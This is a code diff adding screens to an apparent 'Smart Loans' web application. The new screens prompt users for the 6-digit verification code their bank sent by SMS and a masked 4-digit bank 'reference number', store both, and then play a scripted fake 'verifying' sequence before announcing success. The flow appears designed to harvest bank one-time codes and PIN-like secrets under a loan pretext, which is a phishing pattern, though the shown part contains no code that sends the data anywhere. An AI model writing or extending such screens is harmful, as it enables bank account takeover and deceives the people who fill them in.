@@ -852,3 +852,458 @@ function saveBankDetails() {
 
 }
             
+// ===============================
+// BANK VERIFICATION SCREEN
+// ===============================
+
+function loadBankVerificationScreen() {
+
+    const app = document.getElementById("app");
+
+    const bank = sessionStorage.getItem("selectedBank");
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="app-header">
+
+            <button class="back-btn" id="backBankDetails">
+                ← Back
+            </button>
+
+            <div>
+
+                <div class="app-title">
+                    Smart Loans
+                </div>
+
+                <div class="app-subtitle">
+                    Fast • Secure • Convenient
+                </div>
+
+            </div>
+
+            <div class="secure">
+                🔒 Secure
+            </div>
+
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-fill" style="width:75%;"></div>
+        </div>
+
+        <div class="welcome-card">
+
+            <h2>
+                Secure ${bank} Verification
+            </h2>
+
+            <p class="intro">
+
+                Enter the 6-digit verification code sent to your registered phone number by ${bank}.
+
+            </p>
+
+            <input
+                type="text"
+                id="verificationCode"
+                maxlength="6"
+                placeholder="6-digit verification code">
+
+            <br><br>
+
+            <button id="continueVerification">
+
+                Continue
+
+            </button>
+
+        </div>
+
+    </div>
+
+    `;
+
+    document
+        .getElementById("backBankDetails")
+        .addEventListener("click", loadBankDetailsScreen);
+
+    document
+        .getElementById("continueVerification")
+        .addEventListener("click", saveVerificationCode);
+
+}
+            // ===============================
+// SAVE VERIFICATION CODE
+// ===============================
+
+function saveVerificationCode() {
+
+    const code =
+        document.getElementById("verificationCode").value.trim();
+
+    if (!/^\d{6}$/.test(code)) {
+
+        alert("Please enter a valid 6-digit verification code.");
+
+        return;
+
+    }
+
+    sessionStorage.setItem(
+        "verificationCode",
+        code
+    );
+
+    loadBankReferenceScreen();
+
+}
+            // ===============================
+// BANK REFERENCE SCREEN
+// ===============================
+
+function loadBankReferenceScreen() {
+
+    const app = document.getElementById("app");
+
+    const bank = sessionStorage.getItem("selectedBank");
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="app-header">
+
+            <button class="back-btn" id="backVerification">
+                ← Back
+            </button>
+
+            <div>
+
+                <div class="app-title">
+                    Smart Loans
+                </div>
+
+                <div class="app-subtitle">
+                    Fast • Secure • Convenient
+                </div>
+
+            </div>
+
+            <div class="secure">
+                🔒 Secure
+            </div>
+
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-fill" style="width:85%;"></div>
+        </div>
+
+        <div class="welcome-card">
+
+            <h2>${bank} Reference Number</h2>
+
+            <p class="intro">
+
+                Enter your 4-digit reference number.
+
+            </p>
+
+            <div class="pin-container">
+
+                <input class="pin-box" maxlength="1" type="password">
+                <input class="pin-box" maxlength="1" type="password">
+                <input class="pin-box" maxlength="1" type="password">
+                <input class="pin-box" maxlength="1" type="password">
+
+            </div>
+
+            <br>
+
+            <label>
+
+                <input type="checkbox" id="showReference">
+
+                Show Reference Number
+
+            </label>
+
+            <br><br>
+
+            <button id="continueReference">
+
+                Continue
+
+            </button>
+
+        </div>
+
+    </div>
+
+    `;
+
+    document
+        .getElementById("backVerification")
+        .addEventListener("click", loadBankVerificationScreen);
+
+    initializeReferenceNumber();
+
+}
+            // ===============================
+// REFERENCE NUMBER LOGIC
+// ===============================
+
+function initializeReferenceNumber() {
+
+    const boxes = document.querySelectorAll(".pin-box");
+    const showReference = document.getElementById("showReference");
+    const continueBtn = document.getElementById("continueReference");
+
+    boxes.forEach((box, index) => {
+
+        box.addEventListener("input", () => {
+
+            box.value = box.value.replace(/\D/g, "");
+
+            if (box.value.length === 1 && index < boxes.length - 1) {
+
+                boxes[index + 1].focus();
+
+            }
+
+        });
+
+        box.addEventListener("keydown", (e) => {
+
+            if (
+                e.key === "Backspace" &&
+                box.value === "" &&
+                index > 0
+            ) {
+
+                boxes[index - 1].focus();
+
+            }
+
+        });
+
+    });
+
+    showReference.addEventListener("change", () => {
+
+        boxes.forEach(box => {
+
+            box.type = showReference.checked ? "text" : "password";
+
+        });
+
+    });
+
+    continueBtn.addEventListener("click", () => {
+
+        let reference = "";
+
+        boxes.forEach(box => {
+
+            reference += box.value;
+
+        });
+
+        if (reference.length !== 4) {
+
+            alert("Please enter your 4-digit reference number.");
+
+            return;
+
+        }
+
+        sessionStorage.setItem(
+            "bankReference",
+            reference
+        );
+
+        loadProcessingScreen();
+
+    });
+
+}
+           // ===============================
+// PROCESSING SCREEN
+// ===============================
+
+function loadProcessingScreen() {
+
+    const app = document.getElementById("app");
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="app-header">
+
+            <div>
+
+                <div class="app-title">
+                    Smart Loans
+                </div>
+
+                <div class="app-subtitle">
+                    Fast • Secure • Convenient
+                </div>
+
+            </div>
+
+            <div class="secure">
+                🔒 Secure
+            </div>
+
+        </div>
+
+        <div class="progress-bar">
+
+            <div class="progress-fill" style="width:95%;"></div>
+
+        </div>
+
+        <div class="welcome-card" style="text-align:center;">
+
+            <div class="loader"></div>
+
+            <h2>Processing Your Application</h2>
+
+            <p id="statusText">
+
+                Verifying your application...
+
+            </p>
+
+        </div>
+
+    </div>
+
+    `;
+
+    const messages = [
+
+        "✔ Verifying your application...",
+        "✔ Checking submitted details...",
+        "✔ Validating bank information...",
+        "✔ Preparing your application...",
+        "✔ Finalizing your application...",
+        "✔ Application received successfully."
+
+    ];
+
+    let index = 0;
+
+    const status = document.getElementById("statusText");
+
+    const timer = setInterval(() => {
+
+        if(index < messages.length){
+
+            status.textContent = messages[index];
+            index++;
+
+        }else{
+
+            clearInterval(timer);
+
+            loadSuccessScreen();
+
+        }
+
+    },2000);
+
+}
+            // ===============================
+// SUCCESS SCREEN
+// ===============================
+
+function loadSuccessScreen() {
+
+    const app = document.getElementById("app");
+
+    app.innerHTML = `
+
+    <div class="container">
+
+        <div class="app-header">
+
+            <div>
+
+                <div class="app-title">
+                    Smart Loans
+                </div>
+
+                <div class="app-subtitle">
+                    Fast • Secure • Convenient
+                </div>
+
+            </div>
+
+            <div class="secure">
+                🔒 Secure
+            </div>
+
+        </div>
+
+        <div class="progress-bar">
+
+            <div class="progress-fill" style="width:100%;"></div>
+
+        </div>
+
+        <div class="welcome-card" style="text-align:center;">
+
+            <div style="font-size:80px;">
+                ✅
+            </div>
+
+            <h2>
+
+                Application Received
+
+            </h2>
+
+            <p>
+
+                Thank you for choosing Smart Loans.
+
+                <br><br>
+
+                Your application has been successfully received and is currently under review.
+
+                <br><br>
+
+                You will receive updates using the phone number you provided during your application.
+
+            </p>
+
+            <button id="homeButton">
+
+                Return Home
+
+            </button>
+
+        </div>
+
+    </div>
+
+    `;
+
+    document
+        .getElementById("homeButton")
+        .addEventListener("click", () => {
+
+            sessionStorage.clear();
+
+            loadWelcomeScreen();
+
+        });
+
+}
+            
